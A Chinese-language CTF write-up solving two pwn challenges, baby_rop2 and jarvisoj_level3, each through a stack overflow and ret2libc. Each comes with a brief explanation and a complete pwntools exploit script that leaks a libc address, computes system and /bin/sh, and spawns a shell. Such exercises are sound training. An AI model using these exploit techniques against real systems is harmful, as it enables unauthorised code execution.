2. [HarekazeCTF2019]baby_rop2

首先对程序进行检查：

然后发现其没开canary保护，将其放入ida反编译：

发现只有一个栈溢出漏洞，程序中没有system函数和/bin/sh字符串，然后我们考虑用ret2libc方法去做，因为该程序是64位程序，我们需要找到rdi的地址和rsi的地址：


rsi采用第二个，r15在本题中没有用到直接置为0，然后直接套用ret2libc公式去做，构造的exp如下：

from pwn import *
from LibcSearcher import *
context(os='linux',arch='amd64',log_level='debug')
elf=ELF('./babyrop2')
libc=ELF('./libc.so.6')
#p=process('./babyrop2')
p=remote('node4.buuoj.cn',26417)
pop_rdi_adr=0x00400733
pop_rsi_r15_adr=0x00400731
format_str=0x00400770
main_adr=elf.symbols['main']
printf_plt=elf.plt['printf']
read_got=elf.got['read']
payload1=b'a'*0x28+p64(pop_rdi_adr)+p64(format_str)+p64(pop_rsi_r15_adr)+p64(read_got)+p64(0)+p64(printf_plt)+p64(main_adr)
p.recv()
p.sendline(payload1)
read_adr=u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
print('read_adr:'+hex(read_adr))
offset=read_adr-libc.symbols['read']
sys_adr=offset+libc.symbols['system']
binsh_adr=offset+next(libc.search(b'/bin/sh'))
payload2=b'a'*0x28+p64(pop_rdi_adr)+p64(binsh_adr)+p64(sys_adr)
p.recv()
p.sendline(payload2)
p.interactive()

3. jarvisoj_level3

首先对程序进行检查：

将这个32位程序放入ida反编译：

可以看到整个程序比较简单，然后会发现明显的栈溢出，没有system函数和/bin/sh字符串，所以就是标准的ret2libc的解决方法，比起上一道的64位程序比较简单，然后构造exp：

from pwn import *
from LibcSearcher import *
#context(os='linux',arch='i386',log_level='debug')
#p=remote('node4.buuoj.cn',27589)
context.log_level='debug'
p=process('./level3')
elf=ELF('./level3')
main_adr=elf.symbols['main']
write_plt=elf.symbols['write']
write_got=elf.got['write']
payload1=b'a'*(0x88+4)+p32(write_plt)+p32(main_adr)+p32(1)+p32(write_got)+p32(4)
p.recvuntil('Input:\n')
p.send(payload1)
write_adr=u32(p.recv(4))
libc=LibcSearcher("write",write_adr)
offset=write_adr-libc.dump('write')
sys_adr=offset+libc.dump('system')
binsh_adr=offset+libc.dump('str_bin_sh')
payload2=b'a'*(0x88+4)+p32(sys_adr)+p32(0)+p32(binsh_adr)
#p.recvuntil('Input:\n')
#p.recv()
p.send(payload2)
p.interactive()
